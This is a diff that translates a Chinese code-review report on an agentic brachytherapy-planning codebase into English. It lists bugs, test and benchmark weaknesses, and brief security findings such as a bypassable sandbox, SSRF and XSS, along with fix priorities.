+| 8 | 492-503 | 🔴 High | The collinearity check in ray generation is O(N²); floating-point `==` comparison is unreliable |
+| 9 | 692-726 | 🟡 Medium | `compute_convex_hull_mask_from_array` crashes on coplanar points (e.g., a single-layer mask) |
+| 10 | 1280-1322 | 🟡 Medium | `ray_to_ray_distance` computes incorrectly for the parallel case |
+| 11 | 1417-1436 | 🔵 Low | `bandpass_filter` is never called, dead code |
+| 12 | 1440-1464 | 🔵 Low | `distance_filter` documentation says it returns 1e-6 but the code returns 0 |
 
 ### plans/utilizations.py
 
-| # | 行号 | 严重度 | 问题 |
+| # | Lines | Severity | Issue |
 |---|------|--------|------|
-| 13 | 552-604 | 🟡 Medium | `ImageResample_size` 使用 `np.isin` 全数组验证，O(N*M) 太慢 |
-| 14 | 716-752 | 🟡 Medium | `cal_next_seed_pos` 硬编码 `target_value=1` 而非使用参数 |
-| 15 | 755-794 | 🟡 Medium | `cal_next_seed_direc` 同样硬编码 `target_value=1` |
-| 16 | 1463-1483 | 🟡 Medium | `constraint_bounds` 使用 `&`（AND）而非 `|`（OR），`(x<0) & (x>1)` 永远为 False |
-| 17 | 2206-2207 | 🟡 Medium | `line_source_map` 中 z 分量取反无注释，坐标系约定不明 |
-| 18 | 3511-3704 | 🟡 Medium | `select_optimal_trajectory` 每个候选 O(N*M) 性能问题 |
-| 19 | 3682 | 🔴 **Critical** | `reinforcement.reinforcement_planning()` 被调用但 `reinforcement` 导入被注释掉 — RL 规划会崩溃 `NameError` |
-| 20 | 3812-3884 | 🟡 Medium | `get_available_position` 在列表推导中对每个元素调用 3 次 `position_transform` |
-| 21 | 3998-4025 | 🟡 Medium | `remove_unproper_seed` 使用概率选择，变量命名暗示是计数而非阈值 |
+| 13 | 552-604 | 🟡 Medium | `ImageResample_size` uses `np.isin` for full-array validation, O(N*M) too slow |
+| 14 | 716-752 | 🟡 Medium | `cal_next_seed_pos` hardcodes `target_value=1` instead of using a parameter |
+| 15 | 755-794 | 🟡 Medium | `cal_next_seed_direc` likewise hardcodes `target_value=1` |
+| 16 | 1463-1483 | 🟡 Medium | `constraint_bounds` uses `&` (AND) instead of `|` (OR); `(x<0) & (x>1)` is always False |
+| 17 | 2206-2207 | 🟡 Medium | The z-component negation in `line_source_map` has no comment; the coordinate system convention is unclear |
+| 18 | 3511-3704 | 🟡 Medium | `select_optimal_trajectory` has O(N*M) performance problem per candidate |
+| 19 | 3682 | 🔴 **Critical** | `reinforcement.reinforcement_planning()` is called but the `reinforcement` import is commented out — RL planning crashes with `NameError` |
+| 20 | 3812-3884 | 🟡 Medium | `get_available_position` calls `position_transform` 3 times per element in a list comprehension |
+| 21 | 3998-4025 | 🟡 Medium | `remove_unproper_seed` uses probabilistic selection; the variable naming suggests a count rather than a threshold |
 
 ### plans/fitting_model.py
 
-| # | 行号 | 严重度 | 问题 |
+| # | Lines | Severity | Issue |
 |---|------|--------|------|
-| 22 | 276-361 | 🔴 **Critical** | `DoseOptimizationLoss.forward` 在循环中重新赋值 `radiation` 而非原地更新，破坏了梯度计算图 — 优化规划无法正确反向传播 |
-| 23 | 282-321 | 🟡 Medium | 每个种子单独计算旋转矩阵，未批量化，无法利用 GPU 并行 |
-| 24 | 365 | 🔵 Low | 类名 `early_stop` 违反 PEP 8（应为 `EarlyStop`）|
-| 25 | 431-432 | 🟡 Medium | 动态 patience 减半可能导致过早停止 |
+| 22 | 276-361 | 🔴 **Critical** | `DoseOptimizationLoss.forward` reassigns `radiation` in the loop instead of updating in place, breaking the gradient computation graph — optimization planning cannot backpropagate correctly |
+| 23 | 282-321 | 🟡 Medium | The rotation matrix is computed separately for each seed, not batched, so GPU parallelism cannot be exploited |
+| 24 | 365 | 🔵 Low | The class name `early_stop` violates PEP 8 (should be `EarlyStop`) |
+| 25 | 431-432 | 🟡 Medium | Dynamic halving of patience may cause premature stopping |
 
 ### plans/visualizer.py
 
-| # | 行号 | 严重度 | 问题 |
+| # | Lines | Severity | Issue |
 |---|------|--------|------|
-| 26 | 183-186 | 🔴 **Critical** | VTK 图像填充使用三层 Python 循环（512×512×300 = 7800 万次迭代），应使用 `numpy_to_vtk` 零拷贝转换 |
-| 27 | 83-106 | 🟡 Medium | `start()` 方法包含硬编码 demo 代码 |
-| 28 | 355 | 🔵 Low | 参数名拼写错误：`target_vulue` 应为 `target_value` |
+| 26 | 183-186 | 🔴 **Critical** | VTK image filling uses a three-level Python loop (512×512×300 = 78 million iterations); `numpy_to_vtk` zero-copy conversion should be used |
+| 27 | 83-106 | 🟡 Medium | The `start()` method contains hardcoded demo code |
+| 28 | 355 | 🔵 Low | Parameter name typo: `target_vulue` should be `target_value` |
 
 ### plans/reinforcement.py
 
-| # | 行号 | 严重度 | 问题 |
+| # | Lines | Severity | Issue |
 |---|------|--------|------|
-| 29 | 243-256 | 🔴 **Critical** | `_reward_core` 可能为 None（导入失败）但被无保护调用，会崩溃 |
-| 30 | 358-386 | 🟡 Medium | `LowLevelEnv.step` 返回 3-tuple 而非现代 gymnasium 的 5-tuple |
-| 31 | 691-711 | 🟡 Medium | `DVH2Rewards` mask 逻辑使用 `!= target_value` 而非 `== 0`，受浮点精度影响 |
-| 32 | 703-708 | 🔴 **Critical** | `DVH2Rewards` 中 `np.count_nonzero` 可能返回 0 导致除零错误 |
-| 33 | 795-831 | 🟡 Medium | 基线规划在 `reward_calculator.mask_volume` 初始化前访问 |
-| 34 | 1030-1035 | 🟡 Medium | 异常处理器使用可能未定义的 `best_plan` |
+| 29 | 243-256 | 🔴 **Critical** | `_reward_core` may be None (import failure) but is called without protection and will crash |
+| 30 | 358-386 | 🟡 Medium | `LowLevelEnv.step` returns a 3-tuple instead of the modern gymnasium 5-tuple |
+| 31 | 691-711 | 🟡 Medium | The `DVH2Rewards` mask logic uses `!= target_value` instead of `== 0`, affected by floating-point precision |
+| 32 | 703-708 | 🔴 **Critical** | `np.count_nonzero` in `DVH2Rewards` may return 0, causing a division-by-zero error |
+| 33 | 795-831 | 🟡 Medium | Baseline planning is accessed before `reward_calculator.mask_volume` is initialized |
+| 34 | 1030-1035 | 🟡 Medium | The exception handler uses a possibly undefined `best_plan` |
 
 ### plans/brachy_plan_v2.py
 
-| # | 行号 | 严重度 | 问题 |
+| # | Lines | Severity | Issue |
 |---|------|--------|------|
-| 35 | 375-499 | 🔴 High | `replan_single_needle` 包含 30+ 个 `print()` 调试语句，会淹没 stdout |
-| 36 | 442-445 | 🟡 Medium | 用 CTV 段长度覆盖计算出的 `target_depths`，可能在背景间隙放置种子 |
-| 37 | 448-449 | 🟡 Medium | 深度检查后未 return，继续执行 `put_seeds` 浪费计算 |
+| 35 | 375-499 | 🔴 High | `replan_single_needle` contains 30+ `print()` debug statements that flood stdout |
+| 36 | 442-445 | 🟡 Medium | Overwriting the computed `target_depths` with the CTV segment length may place seeds in background gaps |
+| 37 | 448-449 | 🟡 Medium | No return after the depth check; execution continues into `put_seeds`, wasting computation |
 
 ### plans/device_manager.py
 
-| # | 行号 | 严重度 | 问题 |
+| # | Lines | Severity | Issue |
 |---|------|--------|------|
-| 38 | 317 | 🔵 Low | `_leases` 列表在锁外追加，非线程安全 |
+| 38 | 317 | 🔵 Low | The `_leases` list is appended outside the lock, not thread-safe |
 
-### plans/dose_pre/ (剂量预测)
+### plans/dose_pre/ (dose prediction)
 
-| # | 行号 | 严重度 | 问题 |
+| # | Lines | Severity | Issue |
 |---|------|--------|------|
-| 39 | functions.py:79-127 | 🟡 Medium | `line_source_map` 返回 SimpleITK Image，但 `utilizations.py` 版本返回 numpy array，不一致 |
-| 40 | Predict_crop.py:9 | 🔵 Low | `import dose_pre.myDoseNet` 使用绝对路径，作为包导入会失败 |
-| 41 | Predict_crop.py:95-171 | 🔵 Low | 测试代码包含硬编码 Windows 路径 |
-| 42 | myDoseNet.py:125-201 | 🔵 Low | 7 个未使用的上采样层浪费 GPU 内存 |
+| 39 | functions.py:79-127 | 🟡 Medium | `line_source_map` returns a SimpleITK Image, but the `utilizations.py` version returns a numpy array; inconsistent |
+| 40 | Predict_crop.py:9 | 🔵 Low | `import dose_pre.myDoseNet` uses an absolute path and fails when imported as a package |
+| 41 | Predict_crop.py:95-171 | 🔵 Low | Test code contains hardcoded Windows paths |
+| 42 | myDoseNet.py:125-201 | 🔵 Low | 7 unused upsampling layers waste GPU memory |
 
-### skills/ 子系统
+### skills/ Subsystem
 
-| # | 行号 | 严重度 | 问题 |
+| # | Lines | Severity | Issue |
 |---|------|--------|------|
-| 43 | skill_base.py:94 | 🟡 Medium | `find_by_trigger` 排序启发式在 `usage_count=0` 时失效 |
-| 44 | skill_base.py:192-193 | 🟡 Medium | `from_dict` 遇到额外 key 时崩溃（`TypeError`）|
-| 45 | advanced_skills.py:166,191 | 🟡 Medium | LiverFullSkill/LungFullSkill 的 `ref_direc` 参数使用了错误的 key |
+| 43 | skill_base.py:94 | 🟡 Medium | The `find_by_trigger` ordering heuristic fails when `usage_count=0` |
+| 44 | skill_base.py:192-193 | 🟡 Medium | `from_dict` crashes on extra keys (`TypeError`) |
+| 45 | advanced_skills.py:166,191 | 🟡 Medium | The `ref_direc` parameter of LiverFullSkill/LungFullSkill uses the wrong key |
 
 ---
 
-## 12. 测试与基准测试深度审查
+## 12. Testing and Benchmark Deep Review
 
-> 由并行子 Agent 深度审查 `tests/`、`benchmarks/`、根目录 debug/test 文件发现。
+> Discovered by parallel sub-Agents performing deep review of `tests/`, `benchmarks/`, and root-level debug/test files.
 
-### 根目录调试文件 (应从仓库删除)
+### Root-Level Debug Files (should be deleted from the repository)
 
-| 文件 | 严重度 | 问题 |
+| File | Severity | Issue |
 |------|--------|------|
-| `test_quick.py` | 🔴 Critical | 硬编码患者数据路径 `/home/user/.../CTpatient1.nii`，无任何断言 |
-| `test_store.py` | 🔴 High | 硬编码 localhost:5000，无断言 |
-| `test_bugs.py` | 🔴 High | 243 行，零断言，纯手动调试脚本 |
-| `test_bugs2.py` | 🔴 High | 297 行，仅 1 个断言 |
-| `debug_full_flow.py` | 🔴 High | 硬编码时间戳上传路径，仅特定日期有效 |
-| `debug_mask_orientation.py` | 🔴 High | 同上 |
-| `debug_mask_orientation2.py` | 🔴 High | 同上 |
-| `debug_live_mask.py` | 🟡 Medium | 无断言，手动调试脚本 |
+| `test_quick.py` | 🔴 Critical | Hardcoded patient data path `/home/user/.../CTpatient1.nii`, no assertions |
+| `test_store.py` | 🔴 High | Hardcoded localhost:5000, no assertions |
+| `test_bugs.py` | 🔴 High | 243 lines, zero assertions, pure manual debug script |
+| `test_bugs2.py` | 🔴 High | 297 lines, only 1 assertion |
+| `debug_full_flow.py` | 🔴 High | Hardcoded timestamp upload path, only valid on specific dates |
+| `debug_mask_orientation.py` | 🔴 High | Same as above |
+| `debug_mask_orientation2.py` | 🔴 High | Same as above |
+| `debug_live_mask.py` | 🟡 Medium | No assertions, manual debug script |
 
-### tests/ (正式测试)
+### tests/ (formal tests)
 
-| # | 文件 | 严重度 | 问题 |
+| # | File | Severity | Issue |
 |---|------|--------|------|
-| 1 | test_multi_agent_*.py | 🔴 High | 所有 `async def` 测试函数缺少 `@pytest.mark.asyncio` 装饰器 — pytest 收集但不执行，显示"通过"但实际未运行 |
-| 2 | test_multi_agent_phase2.py:66 | 🟡 Medium | "good plan" 测试使用 `v100=0.96` 一定会通过，无边界值测试 |
-| 3 | test_multi_agent_phase3.py:130-161 | 🟡 Medium | 格式测试断言过于宽松 |
-| 4 | test_brain_system.py:76-87 | 🔴 High | 断言特定模型名（`hy3-preview`、`claude-opus-4.7`）会随时间过期 |
-| 5 | test_brain_system.py:92-121 | 🟡 Medium | 假设 `brain_available=False`，无法测试实际 brain 集成 |
-| 6 | 所有测试 | 🔴 High | 零覆盖：HTTP 路由、SSE 流、规划管道、文件上传、会话管理、前端 |
+| 1 | test_multi_agent_*.py | 🔴 High | All `async def` test functions lack the `@pytest.mark.asyncio` decorator — pytest collects but does not run them; they show as "passed" but never actually execute |
+| 2 | test_multi_agent_phase2.py:66 | 🟡 Medium | The "good plan" test uses `v100=0.96` and always passes; no boundary-value tests |
+| 3 | test_multi_agent_phase3.py:130-161 | 🟡 Medium | Format test assertions are too permissive |
+| 4 | test_brain_system.py:76-87 | 🔴 High | Asserts specific model names (`hy3-preview`, `claude-opus-4.7`) that expire over time |
+| 5 | test_brain_system.py:92-121 | 🟡 Medium | Assumes `brain_available=False`, cannot test actual brain integration |
+| 6 | all tests | 🔴 High | Zero coverage: HTTP routes, SSE streams, planning pipeline, file uploads, session management, frontend |
 
 ### benchmarks/
 
-| # | 文件 | 严重度 | 问题 |
+| # | File | Severity | Issue |
 |---|------|--------|------|
-| 7 | 所有 v2 JSON | 🔴 Critical | 硬编码 `/home/user/.../CTpatient1.nii` 路径，不可移植 |
-| 8 | 07_safety.json, 15_safety.json | 🔴 High | `forbidden_keywords` 包含 "done"、"set"、"changed" 等常见英文词，导致误报 |
-| 9 | 30_e2e_clinical_validation.json | 🔴 High | `expected_answer: "90"` 匹配任何含 "90" 的字符串（"D90"、"190"、"90%"），无意义 |
-| 10 | aligned_benchmark.py:220-306 | 🔴 High | 评分函数可游戏：`tool_called` 未调用也给 0.3 分，完整性是二值的 |
-| 11 | aligned_benchmark.py:12-14 | 🔴 Critical | 所有路径硬编码为绝对路径 |
-| 12 | auto_monitor.py:34,41,60,104,125 | 🔴 High | 5 个裸 `except:` 子句，捕获包括 `SystemExit`、`KeyboardInterrupt` |
-| 13 | auto_monitor.py + run_aligned_agents.sh | 🔴 High | 只覆盖类别 1-8，遗漏 9-30 |
-| 14 | archive/ | 🟡 Medium | 58 个日志文件 + 81 个死脚本（1.5MB，18,824 行）|
+| 7 | all v2 JSON | 🔴 Critical | Hardcoded `/home/user/.../CTpatient1.nii` paths, not portable |
+| 8 | 07_safety.json, 15_safety.json | 🔴 High | `forbidden_keywords` contains common English words such as "done", "set", "changed", causing false positives |
+| 9 | 30_e2e_clinical_validation.json | 🔴 High | `expected_answer: "90"` matches any string containing "90" ("D90", "190", "90%"), meaningless |
+| 10 | aligned_benchmark.py:220-306 | 🔴 High | Scoring function is gameable: `tool_called` still awards 0.3 points when not called; completeness is binary |
+| 11 | aligned_benchmark.py:12-14 | 🔴 Critical | All paths hardcoded as absolute paths |
+| 12 | auto_monitor.py:34,41,60,104,125 | 🔴 High | 5 bare `except:` clauses catching including `SystemExit`, `KeyboardInterrupt` |
+| 13 | auto_monitor.py + run_aligned_agents.sh | 🔴 High | Only covers categories 1-8, missing 9-30 |
+| 14 | archive/ | 🟡 Medium | 58 log files + 81 dead scripts (1.5MB, 18,824 lines) |
 
-### 测试框架不一致
+### Inconsistent Test Frameworks
 
-- `test_brain_system.py` 使用 `unittest.TestCase`
-- `test_multi_agent_*.py` 使用原始 `async def`（不兼容 pytest）
-- 根目录文件使用独立脚本
-- 无 `.pytest.ini`、`pyproject.toml` 或 `setup.cfg`
+- `test_brain_system.py` uses `unittest.TestCase`
+- `test_multi_agent_*.py` uses raw `async def` (incompatible with pytest)
+- Root-level files use standalone scripts
+- No `.pytest.ini`, `pyproject.toml`, or `setup.cfg`
 
-### 缺失的测试维度
+### Missing Test Dimensions
 
-- 不同器官部位（前列腺、肺、肝）
-- 不同图像尺寸
-- 损坏/无效的 DICOM 文件
-- LLM 空响应
-- 工具执行中抛异常
-- GPU 内存不足
-- 并发请求同一会话
-
----
-
-## 13. 建议与修复优先级
-
-### 立即修复 (P0)
-
-1. **C-01**: 删除虚拟环境目录
-2. **C-02**: 实现 shell 命令白名单
-3. **C-03**: 实现代码执行沙箱
-4. **C-05**: 引入 DOMPurify 防止 XSS
-5. **C-10**: 实现工具权限控制
-
-### 短期修复 (P1, 1-2 周)
-
-1. **H-01**: 拆分 AgenticSys.py
-2. **H-03**: 重构工具注册
-3. **H-06**: 改进异常处理
-4. **H-08**: 移除全局变量
-5. **C-04**: 加强路径验证
-
-### 中期修复 (P2, 1-2 月)
-
-1. **H-02**: 拆分前端文件
-2. **H-04**: 修复内存泄漏
-3. **H-15**: 添加类型注解
-4. **H-16**: 增加测试覆盖率
-5. **A-01**: 重构为模块化架构
-
-### 长期改进 (P3, 3-6 月)
-
-1. **A-02**: 实现依赖注入
-2. **A-03**: 采用事件驱动架构
-3. **A-04**: 实现统一缓存层
-4. **S-01**: 实现身份认证
-5. **S-04**: 实现数据加密
+- Different organ sites (prostate, lung, liver)
+- Different image sizes
+- Corrupt/invalid DICOM files
+- Empty LLM responses
+- Exceptions thrown during tool execution
+- Insufficient GPU memory
+- Concurrent requests to the same session
 
 ---
 
-## 附录 A: 文件统计
+## 13. Recommendations and Fix Priorities
 
-| 目录 | Python 文件 | JS/HTML/CSS 文件 | 总行数 |
+### Immediate Fixes (P0)
+
+1. **C-01**: Delete the virtual environment directory
+2. **C-02**: Implement a shell command whitelist
+3. **C-03**: Implement a code execution sandbox
+4. **C-05**: Introduce DOMPurify to prevent XSS
+5. **C-10**: Implement tool permission control
+
+### Short-Term Fixes (P1, 1-2 weeks)
+
+1. **H-01**: Split AgenticSys.py
+2. **H-03**: Refactor tool registration
+3. **H-06**: Improve exception handling
+4. **H-08**: Remove global variables
+5. **C-04**: Strengthen path validation
+
+### Medium-Term Fixes (P2, 1-2 months)
+
+1. **H-02**: Split frontend files
+2. **H-04**: Fix memory leaks
+3. **H-15**: Add type annotations
+4. **H-16**: Increase test coverage
+5. **A-01**: Refactor into a modular architecture
+
+### Long-Term Improvements (P3, 3-6 months)
+
+1. **A-02**: Implement dependency injection
+2. **A-03**: Adopt an event-driven architecture
+3. **A-04**: Implement a unified cache layer
+4. **S-01**: Implement authentication
+5. **S-04**: Implement data encryption
+
+---
+
+## Appendix A: File Statistics
+
+| Directory | Python Files | JS/HTML/CSS Files | Total Lines |
 |------|------------|-----------------|--------|
 | AgenticSys.py | 1 | 0 | 6,423 |
 | agents/ | 8 | 0 | ~2,000 |
@@ -1154,12 +1154,12 @@ scipy>=1.10.0
 | web/ | 4 | 3 | ~12,000 |
 | skills/ | 7 | 0 | ~2,000 |
 | plans/ | 12 | 0 | ~4,000 |
-| 其他 | 20+ | 0 | ~3,000 |
-| **总计** | **~200** | **~3** | **~55,000+** |
+| Other | 20+ | 0 | ~3,000 |
+| **Total** | **~200** | **~3** | **~55,000+** |
 
-## 附录 B: 依赖清单
+## Appendix B: Dependency Inventory
 
-### 核心依赖
+### Core Dependencies
 - numpy >= 1.24.0
 - scipy >= 1.10.0
 - SimpleITK >= 2.3.0
@@ -1168,7 +1168,7 @@ scipy>=1.10.0
 - flask >= 3.0.0
 - openai >= 1.0.0
 
-### 可选依赖
+### Optional Dependencies
 - TotalSegmentator >= 2.2.0
 - nnunetv2 >= 2.3.0
 - nibabel >= 5.1.0
@@ -1176,889 +1176,889 @@ scipy>=1.10.0
 
 ---
 
-## 第二轮深度审查 (2026-06-27)
+## Second-Round Deep Review (2026-06-27)
 
-> 5 个并行 Agent 对所有修改后的代码进行二次审查，发现以下新问题。
+> 5 parallel Agents performed a second review of all modified code and discovered the following new issues.
 
-### AgenticSys.py 新发现
+### New Findings in AgenticSys.py
 
-| # | 行号 | 严重度 | 问题 |
+| # | Lines | Severity | Issue |
 |---|------|--------|------|
-| R-01 | 3824 | 🔴 Critical | `page_content` 未定义 — 搜索返回空结果时 NameError 崩溃 |
-| R-02 | 3279-3289 | 🔴 Critical | `_check_search_reliability` 创建新 event loop 未关闭 — 内存泄漏 |
-| R-03 | 5839-5844 | 🔴 Critical | 多 Agent 路由 event loop 未关闭 — 内存泄漏 |
-| R-04 | 6040-6152 | 🔴 Critical | Review phase event loop 未关闭 — 内存泄漏 |
-| R-05 | 1944 | 🔴 Critical | `from AgenticSys import ToolResult` — 类不存在于该模块 |
-| R-06 | 2991-2995 | 🟠 High | 处方剂量乘以 120 — 如果已经是 Gy 则错误 |
-| R-07 | 5041-5154 | 🟠 High | `_pending_callback_events` 无线程锁保护 |
-| R-08 | 4695-4703 | 🟠 High | 流式强制搜索: 成功时 step 状态保持 "pending" |
-| R-09 | 5124-5125 | 🟡 Medium | `time.sleep(0.08)` 在生成器中阻塞整个线程 |
+| R-01 | 3824 | 🔴 Critical | `page_content` undefined — NameError crash when the search returns empty results |
+| R-02 | 3279-3289 | 🔴 Critical | `_check_search_reliability` creates a new event loop without closing it — memory leak |
+| R-03 | 5839-5844 | 🔴 Critical | Multi-Agent routing event loop not closed — memory leak |
+| R-04 | 6040-6152 | 🔴 Critical | Review phase event loop not closed — memory leak |
+| R-05 | 1944 | 🔴 Critical | `from AgenticSys import ToolResult` — the class does not exist in that module |
+| R-06 | 2991-2995 | 🟠 High | Prescription dose multiplied by 120 — wrong if already in Gy |
+| R-07 | 5041-5154 | 🟠 High | `_pending_callback_events` has no thread lock protection |
+| R-08 | 4695-4703 | 🟠 High | Streaming forced search: step status remains "pending" on success |
+| R-09 | 5124-5125 | 🟡 Medium | `time.sleep(0.08)` blocks the entire thread inside a generator |
 
-### web/server.py 新发现
+### New Findings in web/server.py
 
-| # | 行号 | 严重度 | 问题 |
+| # | Lines | Severity | Issue |
 |---|------|--------|------|
-| R-10 | 3148-3229 | 🟠 High | 导出端点缺少路径验证 — 可创建任意目录 |
-| R-11 | 227-285 | 🟠 High | 会话管理非线程安全 (Flask threaded=True) |
-| R-12 | 45-95 | 🟡 Medium | TaskManager 任务永不清理 — 无界内存增长 |
-| R-13 | 112-139 | 🟡 Medium | 速率限制存储非线程安全 |
-| R-14 | 3147-3229 | 🟡 Medium | 导出端点缺少 auth/rate-limit 装饰器 |
+| R-10 | 3148-3229 | 🟠 High | Export endpoint lacks path validation — arbitrary directories can be created |
+| R-11 | 227-285 | 🟠 High | Session management not thread-safe (Flask threaded=True) |
+| R-12 | 45-95 | 🟡 Medium | TaskManager tasks are never cleaned up — unbounded memory growth |
+| R-13 | 112-139 | 🟡 Medium | Rate limit store not thread-safe |
+| R-14 | 3147-3229 | 🟡 Medium | Export endpoint lacks auth/rate-limit decorators |
 
-### web/app/index.html 新发现
+### New Findings in web/app/index.html
 
-| # | 行号 | 严重度 | 问题 |
+| # | Lines | Severity | Issue |
 |---|------|--------|------|
-| R-15 | 6168-6259 | 🔴 Critical | `marked.parse()` 无消毒 — XSS via LLM 输出 |
-| R-16 | 多处 | 🟠 High | innerHTML 使用未消毒的服务器/DICOM 数据 |
-| R-17 | 8931-8940 | 🟡 Medium | DICOM 元数据值未 HTML 转义 |
-| R-18 | 7000-7003 | 🟡 Medium | 思考指示器计时器错误时可能泄漏 |
+| R-15 | 6168-6259 | 🔴 Critical | `marked.parse()` without sanitization — XSS via LLM output |
+| R-16 | multiple | 🟠 High | innerHTML uses unsanitized server/DICOM data |
+| R-17 | 8931-8940 | 🟡 Medium | DICOM metadata values not HTML-escaped |
+| R-18 | 7000-7003 | 🟡 Medium | Thinking indicator timer may leak on error |
 
-### tool_factory/ 新发现
+### New Findings in tool_factory/
 
-| # | 文件 | 严重度 | 问题 |
+| # | File | Severity | Issue |
 |---|------|--------|------|
-| R-19 | web_search/__init__.py:948 | 🔴 Critical | `_search_wanfang` 函数重复定义（复制粘贴合并错误）|
-| R-20 | planning_pipeline.py:1056 | 🟠 High | `ref_direc` 变量未定义 — NameError |
-| R-21 | OAR_seg/__init__.py:146 | 🟠 High | oar_mask 元数据设为 CT 图像而非 OAR mask |
-| R-22 | code_executor/__init__.py | 🟠 High | 沙箱可被绕过 (os, __import__, getattr 允许) |
-| R-23 | shell_executor/__init__.py | 🟠 High | 命令验证可被轻易绕过 |
-| R-24 | dicom_rt_exporter.py:170-187 | 🟠 High | 轮廓几何无效（点云而非轮廓线）|
-| R-25 | dicom_rt_exporter.py:176 | 🟠 High | 物理坐标无方向余弦处理 |
-| R-26 | web_fetch/__init__.py:132 | 🟡 Medium | SSRF 绕过 via IP 编码 |
-| R-27 | env_manager/__init__.py:564 | 🟡 Medium | 卸载跳过包验证 |
-| R-28 | report_generator/__init__.py:108 | 🟡 Medium | D90 单位不匹配 (Gy vs %) |
+| R-19 | web_search/__init__.py:948 | 🔴 Critical | `_search_wanfang` function defined twice (copy-paste merge error) |
+| R-20 | planning_pipeline.py:1056 | 🟠 High | `ref_direc` variable undefined — NameError |
+| R-21 | OAR_seg/__init__.py:146 | 🟠 High | oar_mask metadata set to the CT image instead of the OAR mask |
+| R-22 | code_executor/__init__.py | 🟠 High | Sandbox can be bypassed (os, __import__, getattr allowed) |
+| R-23 | shell_executor/__init__.py | 🟠 High | Command validation can be easily bypassed |
+| R-24 | dicom_rt_exporter.py:170-187 | 🟠 High | Contour geometry invalid (point cloud instead of contour line) |
+| R-25 | dicom_rt_exporter.py:176 | 🟠 High | Physical coordinates lack direction cosine handling |
+| R-26 | web_fetch/__init__.py:132 | 🟡 Medium | SSRF bypass via IP encoding |
+| R-27 | env_manager/__init__.py:564 | 🟡 Medium | Uninstall skips package verification |
+| R-28 | report_generator/__init__.py:108 | 🟡 Medium | D90 unit mismatch (Gy vs %) |
 
-### agents/ 新发现
+### New Findings in agents/
 
-| # | 文件 | 严重度 | 问题 |
+| # | File | Severity | Issue |
 |---|------|--------|------|
-| R-29 | orchestrator.py | 🔴 Critical | 同步回调阻塞事件循环 — 并行 review 变串行 |
-| R-30 | completeness_checker.py | 🟠 High | 使用 SAFETY_GUARDIAN 角色而非 COMPLETENESS_CHECKER |
-| R-31 | safety_guardian.py | 🟠 High | "zh" 标签与英文相同 — 未翻译 |
-| R-32 | fact_checker.py | 🟡 Medium | 硬编码 "pass" 决策 — 不反映实际发现 |
-| R-33 | plan_reviewer.py | 🟡 Medium | 评分公式中 `confidence` 权重不合理 |
+| R-29 | orchestrator.py | 🔴 Critical | Synchronous callback blocks the event loop — parallel review becomes serial |
+| R-30 | completeness_checker.py | 🟠 High | Uses the SAFETY_GUARDIAN role instead of COMPLETENESS_CHECKER |
+| R-31 | safety_guardian.py | 🟠 High | The "zh" label is identical to English — untranslated |
+| R-32 | fact_checker.py | 🟡 Medium | Hardcoded "pass" decision — does not reflect actual findings |
+| R-33 | plan_reviewer.py | 🟡 Medium | The `confidence` weight in the scoring formula is unreasonable |
 
-### brain/ 新发现
+### New Findings in brain/
 
-| # | 文件 | 严重度 | 问题 |
+| # | File | Severity | Issue |
 |---|------|--------|------|
-| R-34 | providers/gemini_llm.py | 🟠 High | Gemini provider 静默丢弃所有 tool calls |
-| R-35 | providers/gemini_llm.py | 🟠 High | Gemini provider 在 system message 时崩溃 |
-| R-36 | core/tree_search_planner.py | 🟠 High | MCTS UCB1 公式错误 — 树搜索本质上是随机的 |
-| R-37 | providers/*.py | 🟡 Medium | 9/16 provider 的 tool call 格式不一致 |
-| R-38 | core/tool_code_writer.py | 🔴 Critical | 可执行 LLM 生成的任意代码 — 安全风险 |
+| R-34 | providers/gemini_llm.py | 🟠 High | Gemini provider silently discards all tool calls |
+| R-35 | providers/gemini_llm.py | 🟠 High | Gemini provider crashes on system messages |
+| R-36 | core/tree_search_planner.py | 🟠 High | MCTS UCB1 formula wrong — tree search is essentially random |
+| R-37 | providers/*.py | 🟡 Medium | tool call format inconsistent across 9/16 providers |
+| R-38 | core/tool_code_writer.py | 🔴 Critical | Can execute arbitrary LLM-generated code — security risk |
 
-### memory/ 新发现
+### New Findings in memory/
 
-| # | 文件 | 严重度 | 问题 |
+| # | File | Severity | Issue |
 |---|------|--------|------|
-| R-39 | interaction_memory.py | 🟡 Medium | `clear()` 方法 NameError 崩溃 |
-| R-40 | experience_memory.py | 🟡 Medium | 无界增长 — 经验永不清理 |
-| R-41 | self_evolution.py | 🟡 Medium | 6 处 `.append()` 无上限 |
-| R-42 | skill_learner.py:124-139 | 🔵 Low | 参数解析 bug — key 格式错误 |
-| R-43 | language.py:140-145 | 🔵 Low | `session_language_store` 是空函数 |
+| R-39 | interaction_memory.py | 🟡 Medium | `clear()` method crashes with NameError |
+| R-40 | experience_memory.py | 🟡 Medium | Unbounded growth — experiences are never cleaned up |
+| R-41 | self_evolution.py | 🟡 Medium | 6 `.append()` calls with no upper bound |
+| R-42 | skill_learner.py:124-139 | 🔵 Low | Argument parsing bug — wrong key format |
+| R-43 | language.py:140-145 | 🔵 Low | `session_language_store` is an empty function |
 
-### plans/device_manager.py 新发现
+### New Findings in plans/device_manager.py
 
-| # | 行号 | 严重度 | 问题 |
+| # | Lines | Severity | Issue |
 |---|------|--------|------|
-| R-44 | 317 | 🟡 Medium | `_leases.append()` 未加锁保护 |
-| R-45 | 326 | 🟡 Medium | `_leases.remove()` 未加锁保护 |
-| R-46 | 291 | 🟡 Medium | `_preferred[caller]` 未加锁保护 |
+| R-44 | 317 | 🟡 Medium | `_leases.append()` not protected by a lock |
+| R-45 | 326 | 🟡 Medium | `_leases.remove()` not protected by a lock |
+| R-46 | 291 | 🟡 Medium | `_preferred[caller]` not protected by a lock |
 
-### 第二轮问题核实与修复状态
+### Second-Round Issue Verification and Fix Status
 
-| # | 问题 | 核实结果 | 状态 |
+| # | Issue | Verification Result | Status |
 |---|------|----------|------|
-| R-01 | `page_content` 未定义 | ✅ 真 bug — 搜索空结果时 NameError | ✅ 已修复 |
-| R-02/03/04 | Event loop 泄漏 | ✅ 真 bug — 异常路径不关闭 loop | ✅ 已修复 (try/finally) |
-| R-05 | `from AgenticSys import ToolResult` | ✅ 真 bug — 类不存在于该模块 | ✅ 已修复 |
-| R-06 | 处方剂量 *120 | ⚠️ 设计决策 — 归一化→Gy 近似转换 | 跳过 (非 bug) |
-| R-07 | `_pending_callback_events` 线程安全 | 待核实 | — |
-| R-08 | 流式搜索 step 状态 | 待核实 | — |
-| R-09 | `time.sleep` 在生成器中 | ⚠️ 80ms 延迟可接受 | 跳过 (非关键) |
-| R-10 | 导出端点路径验证 | 待核实 | — |
